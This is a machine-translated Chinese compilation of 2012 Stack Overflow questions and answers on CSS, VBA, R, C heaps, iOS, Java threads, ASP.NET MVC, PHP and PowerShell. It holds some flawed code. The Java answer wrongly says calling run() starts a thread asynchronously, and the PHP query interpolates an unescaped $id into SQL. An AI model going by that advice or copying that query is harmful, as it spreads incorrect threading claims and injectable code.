好吧，我被这个难住了。如您所见，如果您使用 Internet Explorer 9 查看[此 jsfiddle](http://jsfiddle.net/RLpSa/)，则有一个 div 会在悬停时自动展开。不需要javascript！[无论如何，我用W3C 验证器](http://jigsaw.w3.org/css-validator/validator?uri=http://fiddle.jshell.net/RLpSa/show/&profile=css3&usermedium=all&warning=1&vextwarning=&lang=en)检查了 css，它显示了几个错误，但据我所知，它们是由于供应商特定的属性，或者至少我无法找到语法错​​误等。我怀疑这个对于 IE 9 来说，特定的类可能太多了：

```
div.gridViewScrollerH
{
    width: 916px;
    overflow-x: auto;
    overflow-y: hidden;
    -ms-overflow-x: auto;
    -ms-overflow-y: hidden;
} 
```

以前有人遇到过这个问题吗？有任何想法吗？谢谢

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-12T23:37:00.677

只需添加`display: inline-block;`到课程中

```
div.gridViewScrollerH
{
    display: inline-block;
    width: 916px;
    overflow-x: auto;
    overflow-y: hidden;
    -ms-overflow-x: auto;
    -ms-overflow-y: hidden;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-04-10T12:18:27.320

此问题特定于 IE9。将 div 的溢出样式设置为**滚动**，而不是应用 auto。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-12-09T10:39:54.450

请尝试在课堂上添加 min-height: 0%

# facebook-opengraph - 出现在操作帖子中的 Facebook Open Graph 对象变量名称

> ID：13353258
> 
> 赞同：0
> 
> 时间：2012-11-12T23:21:21.250
> 
> 标签：facebook-opengraph

成功发布我的打开图表操作后，该操作显示得很好。但在文本中，列出的最后一件事是我的对象变量名称，带有冒号，然后是指向对象的链接，它显示标题或完整的 url 链接。由于这有点难以解释，我创建了一个屏幕截图：

![请参阅此屏幕截图中的红色注释](../Images/9075c4a42ce882ac63ce56804fef3b12.png)

我的开放图形对象变量的名称是 "venue" 。从我的服务器返回的场地实际上是正确的。我检查了链接以防万一再次使用调试工具并且没有错误。问题是，它不应该在那里显示。

发生此问题是因为我的打开图形操作尚未获得批准吗？（我还没说完）

当它发生时，我注意到我发布的所有打开的图形操作都以相同的方式显示。但是，其他时候，一切都会好起来的。我明天会检查一下，看看它是否还在发生，但想看看是否有人对正在发生的事情有任何见解

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T01:28:03.820

终于找到了答案。有一个选项可以从新闻提要中隐藏对象。

![从新闻提要中隐藏对象](../Images/c03f73371f9a22061e9da07858bd245a.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T03:28:52.920

我不是这方面的专家，但如果我理解正确的话，这与字幕有关。单击故事详细信息部分下的编辑标题，它将允许您设置接下来几行中显示的内容。

所以你可以做类似的事情

地点：{song.venue}

当然，这是假设您要展示场地。如果没有，您的解决方案有效:)

# vba - 打开工作簿和工作表的事件

> ID：13353260
> 
> 赞同：2
> 
> 时间：2012-11-12T23:21:25.843
> 
> 标签：vba, excel

我正在寻找一种优雅的解决方案来触发打开工作簿以及打开不同工作表的事件。我不需要为每个工作表单独操作：它们都触发相同的方法。

我知道我可以同时使用事件`Workbook_Activate`/ `Workbook_Open`， `Workbook_SheetActivate`但我不知道这是否是“官方方式”。也许有一种方法可以通过一个事件来做到这一点。

我还想知道在我放置代码的地方是否与此事相关。我现在在“ThisWorkbook”中拥有所有代码，而不是在“模块”中......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T20:37:44.790

这是我不久前开发的一些代码，以确保我的经理使用的报告始终根据一天中的时间打开到正确的选项卡。我将此代码存放在我的 VBA 的“ThisWorkbook”模块中。

```
Sub Workbook_Open()

'   Set The Office
Dim begin As String
Dim myNum As String
Dim myNum1 As String
Dim TheDate As String

'   Set Date
    TheDate = Format(DateTime.Now(), "mm-dd-yy")
    Sheets("MORNING").Range("H3").Value = TheDate
    Sheets("AFTERNOON").Range("G3").Value = TheDate
    'Sheets("EVENING").Range("G3").Value = TheDate

'   Select Sheet Based on Time of Day
    If Time >= 0.1 And Time < 0.5 Then
    Sheets("MORNING").Select
    Range("A53").Value = "Report completed by:"
    Range("C53").Value = Application.UserName
    Range("I53").Value = Date & " " & Time
    Range("B27").Select
    Call Populate 'Your next code
        ElseIf Time >= 0.5 And Time < 0.75 Then
        Sheets("AFTERNOON").Select
        Range("A54").Value = "Report completed by:"
        Range("C54").Value = Application.UserName
        Range("I54").Value = Date & " " & Time
        Range("C28").Select
        Call Populate 'Your next code

    End If

End Sub 
```

请注意，我还添加了代码以使用用户 ID 自动签署表单输出并更新日期和时间。我希望这有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-01T01:10:55.213

就像其他人提到的那样：没有单一的事件可以做到这一点。可能有解决方法，但在这种情况下，我更喜欢只使用 _Open 和 _SheetActive。感谢大家！

# r - R中矩阵中向量元素的差异

> ID：13353266
> 
> 赞同：1
> 
> 时间：2012-11-12T23:22:01.857
> 
> 标签：r

我有一个向量`x`。我想创建一个由对元素组成的矩阵，它们的差异小于或等于`1e-2`。我怎样才能在 R 中做到这一点？

```
 x = c(0.0001560653, 0.0001685597, 0.0002793819, 0.0006336307, 0.0455676525,
    0.3184740837, 0.3195122279, 0.3195122606)

    i = which(diff(x) <= 1e-2) 
```

我想要的矩阵如下：

```
 > M
         [,1]         [,2]
  [1,] 0.0001560653 0.0001685597
  [2,] 0.0001685597 0.0002793819
  [3,] 0.0002793819 0.0006336307
  [4,] 0.3184740837 0.3195122279
  [5,] 0.3195122279 0.3195122606 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:16:04.840

像那样：

```
idx <- which(diff(x) <= 0.01)
cbind(x[idx], x[idx+1])
#              [,1]         [,2]
# [1,] 0.0001560653 0.0001685597
# [2,] 0.0001685597 0.0002793819
# [3,] 0.0002793819 0.0006336307
# [4,] 0.3184740837 0.3195122279
# [5,] 0.3195122279 0.3195122606 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:45:42.170

您可以使用`expand.grid`.

```
x <- c(0.0001560653, 0.0001685597, 0.0002793819, 0.0006336307, 0.0455676525,
0.3184740837, 0.3195122279, 0.3195122606)
y <- expand.grid(x,x)
as.matrix(y[abs(y[[2]] - y[[1]]) <= 0.01,])

           Var1         Var2
1  0.0001560653 0.0001560653
2  0.0001685597 0.0001560653
3  0.0002793819 0.0001560653
4  0.0006336307 0.0001560653
9  0.0001560653 0.0001685597
10 0.0001685597 0.0001685597
11 0.0002793819 0.0001685597
... 
```

更新：已编辑以反映已编辑问题中所需的输出。

# r - 将字符串作为第二个参数传递给 transform

> ID：13353277
> 
> 赞同：1
> 
> 时间：2012-11-12T23:22:47.003
> 
> 标签：r, transform

我想编写一个函数，该函数根据从 SQL 表中读取的字符串在数据框中创建新变量。该函数应该有两个参数，`df`和`str`，并返回`df`附加一个额外的列。`str`将是形式的字符串`"a = f(B)"`，其中`a`是 的一列`df`，`B`是 的一组列`df`，`f`是转换函数。

例子：

```
df <- data.frame(EventID = c(111,112,113), Day = c(6,8,15)) 
```

我想要的是`transform(df, Week = ceiling(Day / 7))`，但我不知道如何将字符串`"Week = ceiling(Day / 7)"`（作为字符类型的变量）传递`...`给`transform`.

我尝试了 和 的各种组合`parse`，`eval`但我不知道如何将字符对象更改为 R 文档描述为“标记向量表达式”的内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:32:29.500

这是一种方法：

```
fun <- function(df, str.expression) within(df, eval(parse(text=str.expression)))

fun(df, "Week = ceiling(Day / 7)")
#   EventID Day Week
# 1     111   6    1
# 2     112   8    2
# 3     113  15    3 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:39:19.873

很快就弄清楚了，但我仍然会分享：`eval(parse())`整个事情！

```
eval(parse(text = paste("transform(df,", str, ")", sep = ""))) 
```

也就是说，我更喜欢@flodel 的回答。

# c - 斜堆的C实现

> ID：13353281
> 
> 赞同：1
> 
> 时间：2012-11-12T23:23:10.823
> 
> 标签：c, heap, skew

我正在尝试在 C 中实现倾斜堆，但我的代码无法编译。我在 C 方面没有那么有经验，也从未在 C 中创建过任何类型的堆。这就是为什么我不知道如何解决它，我希望有人能指出我正确的方向。我一直在阅读有关倾斜堆的文章，这是我迄今为止使用我在网上找到的算法得到的。提前致谢。

```
typedef struct node
{
int value;
struct node * root;
struct node * leftchild;
struct node * rightchild;
} Node;

struct skewHeap
{
    struct node * root;
};

void skewHeapInit (struct skewHeap * sk)
{
    sk->root = 0;
}

void skewHeapAdd (struct skewHeap *sk)
{
    struct node *n = (struct node *) malloc(sizeof(struct node));
    assert(n != 0);
    n->value = 0;
    n->leftchild = 0;
    n->rightchild = 0;
    line 185\. s->root = skewHeapMerge(s->root, n);
}

void skewHeapRemoveFirst (struct skewHeap *sk)
{
    struct node * n = sk->root;
    free(n);
    sk->root = skewHeapMerge(n->leftchild, n->rightchild);
}

line 196\. struct node * skewHeapMerge(struct node *left, struct node *right)
{
    struct node *temp = (struct node *) malloc(sizeof(struct node));

    if (left == NULL) 
        return *right;

    if (right == NULL) 
        return *left;

    if (left->value < right-> value)
    {
        temp = left->leftchild;
        left->leftchild = skewHeapMerge(left->rightchild, right);
        left->rightchild = temp;
        return left;
    }
    else
    {
        temp = right->rightchild;
        right->rightchild = skewHeapMerge(right->leftchild, left);
        right->leftchild = temp;
        return right;
    }
} 
```

这些是我目前遇到的编译错误：

```
program.c: In function ‘skewHeapAdd’:
program.c:185: warning: implicit declaration of function ‘skewHeapMerge’
program.c:185: warning: assignment makes pointer from integer without a cast
program.c: In function ‘skewHeapRemoveFirst’:
program.c:191: warning: assignment makes pointer from integer without a cast
program.c: At top level:
program.c:196: error: conflicting types for ‘skewHeapMerge’
program.c:185: note: previous implicit declaration of ‘skewHeapMerge’ was here
program.c: In function ‘skewHeapMerge’:
program.c:202: error: incompatible types when returning type ‘struct node’ but ‘struct   node *’ was expected
program.c:205: error: incompatible types when returning type ‘struct node’ but ‘struct node *’ was expected 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:34:56.203

关于编译器错误，

```
program.c: In function ‘skewHeapAdd’:
program.c:185: warning: implicit declaration of function ‘skewHeapMerge’
program.c:185: warning: assignment makes pointer from integer without a cast 
```

告诉您定义`skewHeapMerge`的范围内没有 of 的原型`skewHeapAdd`，因此（编译器显然在 C89 模式下运行，但谢天谢地对此发出警告），编译器假设有一个返回类型`int`为 for的隐式声明`skewHeapMerge`。

添加一个包含所有函数原型的头文件，以及`#include`在所有`*.c`使用或定义这些函数的文件中，以便编译器知道函数的类型。

```
program.c: In function ‘skewHeapRemoveFirst’:
program.c:191: warning: assignment makes pointer from integer without a cast 
```

那应该是行

```
sk->root = skewHeapMerge(n->leftchild, n->rightchild); 
```

其中`sk->root`是 a `struct node*`，但由于 的隐式声明`skewHeapMerge`，假定返回 a `int`。

```
program.c: At top level:
program.c:196: error: conflicting types for ‘skewHeapMerge’
program.c:185: note: previous implicit declaration of ‘skewHeapMerge’ was here 
```

在这里，编译器发现 的定义`skewHeapMerge`给出的类型与隐式声明中的类型冲突。

```
program.c: In function ‘skewHeapMerge’:
program.c:202: error: incompatible types when returning type ‘struct node’ but ‘struct   node *’ was expected
program.c:205: error: incompatible types when returning type ‘struct node’ but ‘struct node *’ was expected 
```

那是为了线

```
if (left == NULL) 
    return *right;

if (right == NULL) 
    return *left; 
```

你应该返回的地方`right`。`left`而不是`*right`相应的。`*left`（起初我忽略了这一点）。

* * *

你有一个错误`skewHeapRemoveFirst`

```
void skewHeapRemoveFirst (struct skewHeap *sk)
{
    struct node * n = sk->root;
    free(n);
    sk->root = skewHeapMerge(n->leftchild, n->rightchild);
} 
```

d`n`后在哪里使用。`free`您必须交换该函数中的最后两行。

而在`skewHeapMerge`

```
struct node * skewHeapMerge(struct node *left, struct node *right)
{
    struct node *temp = (struct node *) malloc(sizeof(struct node));

    if (left == NULL)
        return *right;

    if (right == NULL)
        return *left; 
```

你正在泄漏内存。删除分配，因为 if`temp`完全被使用，你分配`left->leftchild`或分配`right->rightchild`给它。

# fonts - SDL TTF 在某些字体上未显示省略号

> ID：13353283
> 
> 赞同：2
> 
> 时间：2012-11-12T23:23:27.673
> 
> 标签：fonts, sdl, sdl-ttf

在某些字体上，我无法让 SDL_TTF 呈现某些字形（例如……），即使我知道它们存在（如果我在 gedit 中使用相同的字体，它也可以正常工作）。

生成文件：

```
test: test.c
    gcc -o test -ansi -pedantic -Wall test.c `sdl-config --cflags --libs` -lSDL_ttf 
```

示例（test.c）：

```
#include <SDL/SDL.h>
#include <SDL/SDL_ttf.h>

int main(int argc, char *argv[]) {
    SDL_Init(SDL_INIT_EVERYTHING);
    TTF_Init();

    {
        SDL_Event ev;
        SDL_Color color = {255,255,255};
        SDL_Surface *win = SDL_SetVideoMode(640, 480, 16, SDL_HWSURFACE | SDL_DOUBLEBUF);
        TTF_Font *drawfont = TTF_OpenFont("./ProggySquareSZ.ttf", 22);
        SDL_Surface *text_surface = TTF_RenderUTF8_Solid(drawfont,"…",color);
        SDL_Rect r = {10, 10, 0, 0};
        SDL_BlitSurface(text_surface,NULL,win,&r);

        SDL_Flip(win);
        while(SDL_WaitEvent(&ev)) {
            if(ev.type == SDL_QUIT) break;
        }
    }

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T14:51:57.027

# ios - iOS：自定义类导入

> ID：13353286
> 
> 赞同：0
> 
> 时间：2012-11-12T23:23:54.370
> 
> 标签：ios, class

我将一些将多次使用的代码移到一个类中。我没有得到错误，但我也没有得到结果。它似乎完全跳过了我的课。理想情况下，这个类应该做 NSURL conns 和 XMLParser 的东西来咀嚼来自我们托管 API 的数据馈送。我已经完成了这项工作，但想将我的代码的一些主要逻辑凝固并在某种程度上规范化/集中化。

一个函数 'bdCheckIfFileExistsAndisValid' 应该接受一个字符串但返回 BOOL 并且它根本没有被调用。

'bdParsePlaylistXML' 也不是应该接受一个字符串并返回一个数组的。

我在课堂上到处都设置了断点，没有一个被击中。我是新手，所以我不确定我是否做对了所有事情。这是一些代码，在此先感谢。

--------------------自定义类：（.h）

```
@interface bdXMLParser : NSObject {

    NSMutableArray *playlist;

    //Playlist XML info
    BOOL recordTrackName;
    BOOL recordTrackDescription;
    BOOL recordTrackThumbnailAbsoluteLocation;
    BOOL recordTrackURL;
    NSString *TrackName;
    NSString *TrackDescription;
    NSString *TrackThumbnailAbsoluteLocation;
    NSString *TrackURL;

}

-(NSMutableArray*) bdParsePlaylistXML:(NSString *) playlistXMLFileName;

-(BOOL) bdCheckIfFileExistsAndisValid:(NSString *) localFileName; 
```

----------------自定义类（.m）：

```
#import "bdXMLParser.h"

@implementation bdXMLParser
{
    NSMutableData *webData;

    NSMutableArray *playlist;
    NSXMLParser *xmlParserPlaylist;    
}

-(NSString*) bdDocumentsDirectory{
    NSString* documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];
    return documentsPath;
}

-(int) bdCheckFileCreationDate:(NSString *) fileName {

    //get XML file path
    NSString *localFilePath = [[self bdDocumentsDirectory] stringByAppendingPathComponent:fileName];

    //local file check
    NSFileManager *filemgr;
    filemgr = [NSFileManager defaultManager];
    NSDictionary* attrs = [filemgr attributesOfItemAtPath:localFilePath error:nil];
    NSDate *fileCreationDate = [attrs objectForKey: NSFileCreationDate];
    NSDate *rightNow = [NSDate date];
    NSTimeInterval lastDiff = [fileCreationDate timeIntervalSinceNow];
    int lastDiffINT = round(lastDiff);

    NSLog(@"NSFileCreationDate:%@",fileCreationDate);
    NSLog(@"CurrentDate:%@",rightNow);
    NSLog(@"lastDiff:%f",lastDiff);

    return lastDiffINT;    
}

-(BOOL) bdCheckIfFileExistsAndisValid:(NSString *) fileName {    
    //local file check    
    NSString* foofile = [[self bdDocumentsDirectory] stringByAppendingPathComponent:fileName];
    BOOL fileExists = [[NSFileManager defaultManager] fileExistsAtPath:foofile];

    if ((fileExists == YES) && ([self bdCheckFileCreationDate:foofile] > -86400))//(24 hrs = 86400 seconds)
        return YES;
    else
        return NO;

} 
```

这是我尝试使用它的视图：（menu.h）

```
#import "bdXMLParser.h"
@interface MenuScreenViewController : UIViewController <NSXMLParserDelegate>
- (IBAction)btnPlayerPlayPause:(id)sender;

(menu.m)

- (IBAction)btnPlayerPlayPause:(id)sender {
    //if array exists, don't reload xml, dont reparse xml, just go to the view
    if (playlist.count == 0){

        //Playlist!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        //========================================================================
        //1st: check to see if we have a local cached xml data
        //if we do, check if it is <24hr old and if so load it
        //if not, go get it with connection and overwrite/store it

        //init blogs NSMutableArray
        playlist = [[NSMutableArray alloc] init];

        //local file check
        bdXMLParser *myParser;
        BOOL fileExistsAndValid = NO;
=HERE!==fileExistsAndValid = [myParser bdCheckIfFileExistsAndisValid:PlaylistName];        

        //1st
        if (fileExistsAndValid)//(<24 hrs old)
        {
            NSLog (@"File fileExistsAndValid");

=AND HERE!!=playlist = [myParser bdParsePlaylistXML:PlaylistName];
            NSLog(@"playlist:%u", playlist.count);
            //load first track
            [self LoadTrack:0];
        }
        else{

            NSLog (@"File doesn't exist");
            //call refresh function
            //[self refreshAlbumPhotoXML];
            [myParser bdRefreshPlaylistXML];
        }
    }   
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:26:58.730

你忘了开课

```
bdXMLParser *myParser= [[bdXMLParster alloc]init]; 
```

# ios - 使用平移手势重置 UIView 的框架，无需硬编码起始值

> ID：13353288
> 
> 赞同：2
> 
> 时间：2012-11-12T23:23:56.820
> 
> 标签：ios, uiview, uipangesturerecognizer

我有一个附加到 UIView 的 UIPanGestureRecognizer。我想要做的基本上是拖放到一个桶中。如果用户放开 UIView 并且它不在存储桶中，我希望它动画回到原来的起始位置。为我的 UIPanGestureRecognizer 调用的选择器是：

```
- (void)handleDragDescriptionView:(UIPanGestureRecognizer *)gestureRecognizer {
    UIView *panViewPiece = [gestureRecognizer view];
    CGRect originalFrame = CGRectMake(946, 20, 58, 30);

    CGPoint translation = [gestureRecognizer translationInView:panViewPiece];
    if (gestureRecognizer.state == UIGestureRecognizerStateBegan || gestureRecognizer.state == UIGestureRecognizerStateChanged) {
        panViewPiece.center = CGPointMake(panViewPiece.center.x + translation.x, panViewPiece.center.y + translation.y);

        [gestureRecognizer setTranslation:CGPointZero inView:panViewPiece.superview];
    }
    else if (gestureRecognizer.state == UIGestureRecognizerStateCancelled) {
        [UIView animateWithDuration:0.25 animations:^{
            self.dragDescriptionView.frame = originalFrame;
        }];
    }
    else {
        [UIView animateWithDuration:0.25 animations:^{
            self.dragDescriptionView.frame = originalFrame;
        }];
    }

} 
```

我想知道我是否可以在没有`originalFrame`方法顶部的情况下做到这一点。我原本有

```
CGRect originalFrame = _dragDescriptionView.frame; 
```

而不是硬编码，但它不会快速恢复。可能是因为我在拖动时更新了该值。我不是特别喜欢硬编码值，但我不确定是否有办法解决这个问题。谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T23:39:09.657

您实际上只需要跟踪视图的原始中心。创建一个实例变量并仅在`originalCenter`手势开始时设置它：

```
@implementation MyViewController {
    CGPoint _originalCenter;
}

- (void)handleDragDescriptionView:(UIPanGestureRecognizer *)gestureRecognizer {
    UIView *panViewPiece = [gestureRecognizer view];

    switch (gestureRecognizer.state) {
        case UIGestureRecognizerStateBegan:
            _originalCenter = panViewPiece.center;
            break;

        case UIGestureRecognizerStateChanged: {
            CGPoint translation = [gestureRecognizer translationInView:panViewPiece.superview];
            panViewPiece.center = CGPointMake(panViewPiece.center.x + translation.x, panViewPiece.center.y + translation.y);
            [gestureRecognizer setTranslation:CGPointZero inView:panViewPiece.superview];
            break;
        }

        case UIGestureRecognizerStateEnded:
        case UIGestureRecognizerStateCancelled: {
            [UIView animateWithDuration:0.25 animations:^{
                panViewPiece.center = _originalCenter;
            }];
            break;
        }

        default:
            break;
    }
} 
```

# java - Java中的OpenMP任务

> ID：13353289
> 
> 赞同：3
> 
> 时间：2012-11-12T23:23:57.187
> 
> 标签：java, multithreading

我是相当新的`Java Threads`，我通常使用 C 来进行并行化。并行化与它遵循的具有相同模式的算法：

```
void traverse(node* p)
{
    if (p->left)
        #pragma omp task // p is firstprivate by default
        traverse(p->left);
    if (p->right)
        #pragma omp task // p is firstprivate by default
        traverse(p->right);
} 
```

例如，我会使用 的任务指令`openMP`。

**任务描述**

> 当线程遇到任务构造时，会从相关结构化块的代码中生成任务。遇到的线程可以立即执行任务，或推迟执行。在后一种情况下，可以为团队中的任何线程分配任务。使用任务同步结构可以保证任务的完成。任务构造可以嵌套在外部任务中，但内部任务的任务区域不是外部任务的任务区域的一部分。

我的问题是：

我怎样才能实现同样的想法（任务）`Java Threads`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:40:01.307

OpenMP 的编译指示确实使并行化更容易一些。

在 Java 中，您首先需要创建一个实现 Runnable 的类。
- 示例：公共类遍历实现 Runnable

然后你只需要创建类并调用'run'来启动线程。

```
private void traverse(node p) 
{
   Traverse t = null;

    if (p.left)
       t = new Traverse(p.left);
    if (p->right)
       t = new Traverse(p.right)

    t.run();   // start thread. this call will not wait for run to finishes
} 
```

# ios - UIAccelerationValue 的最小值和最大值？

> ID：13353291
> 
> 赞同：0
> 
> 时间：2012-11-12T23:24:07.177
> 
> 标签：ios, numbers, max, minimum

如果之前有人问过这个问题，请原谅我，但我试图将 UIAccelerationValue 限制在 2 个数字之间，这几乎是一个最小值和一个最大值。

所以，现在我不确定如何或是否应该使用 MAX 或 MIN 函数。

简单地说，我不希望我的变量 'accelerationValue' 低于 -10 或 10。

我将如何使用 MIN 或 MAX 函数来实现这一点，如果之前有人问过这个问题或者这是一个愚蠢的问题，请再次原谅我。

谢谢！

# android - iOS 相当于 Android 的 SharedPreferences

> ID：13353293
> 
> 赞同：8
> 
> 时间：2012-11-12T23:24:11.230
> 
> 标签：android, objective-c, ios

我正在寻找相当于 Android 的[SharedPreferences](http://developer.android.com/reference/android/content/SharedPreferences.html)的 iOS 版本。对于 iOS 用户来说，SharedPreferences 是一个简单的键值查找，可以跨多个活动和视图使用。

我需要获取用户的姓名、年龄和身高并将其存储起来，以便该应用程序的所有 iOS 视图都可以访问它。在 iOS 中执行此操作的最佳方法是什么？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-12T23:26:05.450

看看`NSUserDefaults`（[文档链接](http://developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Classes/NSUserDefaults_Class/Reference/Reference.html)）

`[NSUserDefaults standardUserDefaults]`相当于 default `SharedPreferences`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:32:51.207

您可以存储设置包。这是文档的链接：http: [//developer.apple.com/library/ios/#documentation/cocoa/Conceptual/UserDefaults/Preferences/Preferences.html](http://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/UserDefaults/Preferences/Preferences.html)

# c# - 如何在 MVC 3 中通过 jQuery 加载传递对象数组？

> ID：13353294
> 
> 赞同：3
> 
> 时间：2012-11-12T23:24:10.417
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, jquery

我不打算使用 ajax jQuery 方法。我想对 div 使用 .load() 方法。这是我的 javascript 方法的样子：

```
function PartialViewLoadArray(aName, aValue, aGuid, aName2, aValue2, aGuid2) {

    modelArray = [];

    modelArray.push({ Name: aName, Value: aValue, Guid: aGuid });
    modelArray.push({ Name: aName2, Value: aValue2, Guid: aGuid2 });

    $('#examplediv').load(
        '/Example/PartialByModelArray/',
        { ModelArray: modelArray },
        function () {
            alert('the load has completed!');
        }
    );
} 
```

这是控制器上的操作：

```
public PartialViewResult PartialByModelArray(ExamplePartialArrayModel aModel)
{
    return PartialView("_ExamplePartialByArray", aModel);
} 
```

我的阵列模型：

```
public class ExamplePartialArrayModel
{
    public ExamplePartialModel[] ModelArray { get; set; }
} 
```

上述模型中包含的模型：

```
public class ExamplePartialModel
{
    private string _Name;
    private int? _Value;
    private string _Guid;

    public string Name
    {
        get { return this._Name; }
        set { this._Name = value; }
    }

    public int? Value
    {
        get { return this._Value; }
        set { this._Value = value; }
    }

    public string Guid
    {
        get { return this._Guid; }
        set { this._Guid = value; }
    }
} 
```

我知道如果我使用上下文和字符串编写器等手动渲染部分视图，我可以让这个 div 加载内容，但在我看来，我应该能够让这个 load() 语句工作。为什么 MVC 不提取这些数据？非常奇怪的是，当我在操作的第一行设置断点时，它向我显示了数组中的两个项目——但它们的所有属性都是空的。它如何确定数组中的项目数量但不绑定它们的值？到底是怎么回事？我很迷惑。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:54:23.003

问题是数据作为表单数据发布，而 jquery 以默认模型绑定器无法理解的格式执行此操作。在我的测试中，我使用[fiddler](http://www.fiddler2.com/fiddler2/)来查看数据以这种格式通过：

```
ModelArray[0][Name]  : name1
ModelArray[0][Value] : value1
ModelArray[0][Guid]  : guid1
ModelArray[1][Name]  : name2
ModelArray[1][Value] : value2
ModelArray[1][Guid]  : guid2 
```

解决此问题的最简单方法是以 json 格式发布数据：

```
function PartialViewLoadArray(aName, aValue, aGuid, aName2, aValue2, aGuid2) {
    var modelArray = [];

    modelArray.push({ Name: aName, Value: aValue, Guid: aGuid });
    modelArray.push({ Name: aName2, Value: aValue2, Guid: aGuid2 });

    $.ajax({
        type: 'POST',
        url: '/home/PartialByModelArray/',
        contentType: 'application/json',
        data: { ModelArray: modelArray },
        success: function (response) {
            $('#examplediv').replaceWith(response);
        }
    });
} 
```

请注意，此代码使用[json2](https://github.com/douglascrockford/JSON-js)库对 json 数据进行编码，并且您的控制器操作应使用 [HttpPost] 属性进行标记。

我不确定您为什么不想使用 ajax 方法，但您也可以考虑寻找一种方法将表单数据编码为更适合 mvc 的格式或编写自定义模型绑定器，但这一切似乎都是更多的努力。[这篇文章](http://haacked.com/archive/2008/10/23/model-binding-to-a-list.aspx)更多地解释了这个问题，可能会给你一些想法。

# php - 如何使用 PHP 从文件名的引用中将图片显示到图库

> ID：13353298
> 
> 赞同：0
> 
> 时间：2012-11-12T23:24:28.733
> 
> 标签：php, mysql, image, photo-gallery

我一定在这里做错了什么。它不像它应该的那样工作，但它是一项简单的任务，仅用于一个目的，将我`./images`和`./thumbnails`文件夹中的照片显示到我的 PHP Web 表单。它还没有完全完成，但我只想获得能够在我的页面上看到我显示的照片的功能。

两个文件夹中的图像名称相同，大小不同。以下是两个文件夹中的一些示例照片名称。`IMG786_3, IMG3413, IMG31`.

这是对我的数据库的查询，它检索存储在我的数据库中的所有照片的所有标题、描述和文件名。我将它们放入一个数组中，以便我可以根据索引访问它们。

```
$imgQuery = "SELECT FileName, Title, Description FROM PICTURE WHERE OwnerID='$id' LIMIT 0,7";   
if($imgResult = mysqli_query($link, $imgQuery))
{
while($imgRow = mysqli_fetch_row($imgResult))
{
    $filename[] = $imgRow[0];
    $title[] = $imgRow[1];
    $description[] = $imgRow[2];
}
} 
```

下面是应该显示我拥有的两个文件夹中的这些照片字符串的代码。当我单击缩略图时，假设从`./images`文件夹中获取完整大小的图像，并且文件名、描述和标题的整个索引将发生变化。

```
print <<<photo
<body>
<span> <?php echo $error; ?> </span>
<form action='MyAlbum.php' method='post'>
    <table>
        <tr><td colspan='7' ><h2 align='center'>$name's Album</h2></td>
        </tr>
        <tr><td colspan='7' >$title[$i]</td>
        </tr>
        <tr><td colspan='5' ><img src="./images/$filename[$i]" /></td><td colspan='2'>$description[$i] </td>
        </tr>
        <tr>
            <td><img src="./thumbnails/$filename[0]" /></td> <td><img src="./thumbnails/$filename[1]" /></td> <td><img src="./thumbnails/$filename[2]" /></td> 
            <td><img src="./thumbnails/$filename[3]" /></td><td><img src="./thumbnails/$filename[4]" /></td> <td><img src="./thumbnails/$filename[5]" /></td> 
            <td><img src="./thumbnails/$filename[6]" /></td> 
        </tr>
    </table>
</form>
</body>
</html>

photo; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:39:01.600

你的heredoc是错误的。1st - 您应该遍历文件名以获取缩略图。第二 - 你得到带有变量 $i 的图像，它看起来像一个迭代器，但不存在 for 循环。

我已将heredoc 修改为有效的html。您仍然需要 javascript/jquery（我更喜欢）来实现您的图像替换工作。默认情况下，页面加载时会显示第一张图片。

```
<html>
<body>
<span> <?php //echo $error; ?> </span>
<form action='MyAlbum.php' method='post'>
    <table border="1">
        <tr><td colspan='7' ><h2 align='center'><?php echo $name ?>'s Album</h2></td>
        </tr>
        <tr><td colspan='7' >
            <?php echo $title[0]; ?></td>
        </tr>
        <tr>
            <td colspan='5' ><img src="./images/<?php echo $filename[0] ?>" /></td>
            <td colspan='2' ><?php echo $description[0]; ?></td>
        </tr>
        <tr>
         <?php foreach($filename as $f): ?>   
            <td><img src="./thumbnails/<?php echo $f ?>" /></td>
         <?php endforeach; ?>
        </tr>
    </table>
</form>
</body>
</html> 
```

还有一件事。使用 3 个不同的数组效率不高。1个关联数组可以很好地完成这项工作。如果您有疑问，请让我知道。

丁斯

# powershell - Powershell：哈希表内容未显示在函数中

> ID：13353300
> 
> 赞同：5
> 
> 时间：2012-11-12T23:24:55.493
> 
> 标签：powershell, hashtable

我有一个向其传递哈希表的函数。在我想要的功能中 1）通过 Write-Host 在屏幕上显示文本；2) 一次显示哈希表的内容——提供通常的两列“名称”/“值”哈希表显示。3) 让函数返回`$true`or `$false`。

```
MyFunction $MyHashTable 
```

在函数内：

```
param (
    [hashtable]$TheHashTable
)
#  Sundry things here and then:
write-host "Some information to display on-screen`n"
#  and then:
$TheHashTable 
```

